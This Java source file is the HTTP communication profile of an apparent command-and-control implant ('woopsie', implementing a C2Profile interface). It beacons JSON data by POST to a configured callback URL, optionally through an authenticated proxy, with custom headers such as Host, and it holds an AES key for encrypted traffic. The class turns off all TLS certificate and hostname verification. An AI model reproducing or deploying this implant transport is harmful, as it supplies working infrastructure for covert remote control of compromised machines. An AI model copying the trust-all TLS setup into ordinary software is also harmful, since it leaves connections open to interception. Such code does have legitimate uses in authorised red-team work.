package com.woopsie.profiles;

import com.woopsie.Config;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
import org.apache.hc.client5.http.impl.routing.DefaultProxyRoutePlanner;
import org.apache.hc.core5.http.HttpHost;
import org.apache.hc.core5.http.io.entity.StringEntity;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.client5.http.auth.AuthScope;
import org.apache.hc.client5.http.auth.UsernamePasswordCredentials;
import org.apache.hc.client5.http.impl.auth.BasicCredentialsProvider;
import org.apache.hc.client5.http.ssl.SSLConnectionSocketFactory;
import org.apache.hc.client5.http.ssl.TrustAllStrategy;
import org.apache.hc.client5.http.ssl.NoopHostnameVerifier;
import org.apache.hc.core5.ssl.SSLContextBuilder;
import javax.net.ssl.SSLContext;

/**
 * Simple HTTP profile - single endpoint communication
 */
public class HttpProfile implements C2Profile {
    private final Config config;
    private final CloseableHttpClient httpClient;
    private byte[] aesKey;
    
    public HttpProfile(Config config) {
        this.config = config;
        this.httpClient = buildHttpClient(config);
        this.aesKey = null;
    }
    
    private static CloseableHttpClient buildHttpClient(Config config) {
        try {
            HttpClientBuilder builder = HttpClients.custom();
            
            // Disable SSL certificate verification (like oopsie's danger_accept_invalid_certs)
            SSLContext sslContext = SSLContextBuilder.create()
                .loadTrustMaterial(new TrustAllStrategy())
                .build();
            SSLConnectionSocketFactory sslSocketFactory = new SSLConnectionSocketFactory(
                sslContext,
                NoopHostnameVerifier.INSTANCE
            );
            builder.setConnectionManager(
                org.apache.hc.client5.http.impl.io.PoolingHttpClientConnectionManagerBuilder.create()
                    .setSSLSocketFactory(sslSocketFactory)
                    .setValidateAfterInactivity(org.apache.hc.core5.util.Timeout.ofSeconds(2))
                    .build()
            );
            
            // Enable automatic retry on connection failures (especially for proxy issues)
            builder.setRetryStrategy(new org.apache.hc.client5.http.impl.DefaultHttpRequestRetryStrategy(
                3, // max 3 retries
                org.apache.hc.core5.util.TimeValue.ofMilliseconds(100) // 100ms delay between retries
            ));
            
            // Configure proxy if set
            if (config.hasProxy()) {
                HttpHost proxy = new HttpHost(config.getProxyHost(), config.getProxyPort());
                DefaultProxyRoutePlanner routePlanner = new DefaultProxyRoutePlanner(proxy);
                builder.setRoutePlanner(routePlanner);
                
                Config.debugLog(config, "Configuring HTTP proxy: " + config.getProxyHost() + ":" + config.getProxyPort());
                
                // Add proxy authentication if credentials provided
                if (config.getProxyUser() != null && !config.getProxyUser().isEmpty()) {
                    BasicCredentialsProvider credsProvider = new BasicCredentialsProvider();
                    credsProvider.setCredentials(
                        new AuthScope(proxy),
                        new UsernamePasswordCredentials(config.getProxyUser(), config.getProxyPass().toCharArray())
                    );
                    builder.setDefaultCredentialsProvider(credsProvider);
                    Config.debugLog(config, "Proxy authentication configured for user: " + config.getProxyUser());
                }
            }
            
            return builder.build();
        } catch (Exception e) {
            throw new RuntimeException("Failed to create HTTP client", e);
        }
    }
    
    @Override
    public String send(String data) throws Exception {
        String url = config.getCallbackUrl() + config.getPostUri();
        Config.debugLog(config, "HTTP POST to: " + url);
        
        HttpPost post = new HttpPost(url);
        
        // Set all headers from config (includes User-Agent and any custom headers like Host)
        java.util.Map<String, String> headers = config.getHeaders();
        if (headers != null) {
            for (java.util.Map.Entry<String, String> header : headers.entrySet()) {
                post.setHeader(header.getKey(), header.getValue());
                Config.debugLog(config, "Setting header: " + header.getKey() + ": " + header.getValue());
            }
        }
        
        post.setHeader("Content-Type", "application/json");
        post.setEntity(new StringEntity(data));
        
        try (CloseableHttpResponse response = httpClient.execute(post)) {
            int statusCode = response.getCode();
            String responseBody = EntityUtils.toString(response.getEntity());
            
            Config.debugLog(config, "HTTP response status: " + statusCode);
            
            if (statusCode >= 200 && statusCode < 300) {
                return responseBody;
            } else {
                throw new Exception("HTTP request failed with status: " + statusCode);
            }
        }
    }
    
    @Override
    public byte[] getAesKey() {
        return aesKey;
    }
    
    @Override
    public void setAesKey(byte[] key) {
        this.aesKey = key;
    }
    
    @Override
    public String getProfileName() {
        return "http";
    }
}
